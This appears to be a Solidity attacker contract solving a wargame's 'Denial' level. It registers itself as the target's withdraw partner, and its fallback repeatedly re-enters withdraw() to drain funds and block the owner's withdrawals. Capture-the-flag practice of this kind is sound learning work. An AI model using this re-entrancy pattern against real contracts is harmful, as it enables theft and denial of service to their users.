pragma solidity ^0.8.0;

interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address _partner) external;
}

contract Denial {
    address levelInstance;

    constructor(address _levelInstance) {
        levelInstance = _levelInstance;
    }

    fallback() external payable {
        IDenial(levelInstance).withdraw();
    }

    function set() public {
        IDenial(levelInstance).setWithdrawPartner(address(this));
    }
}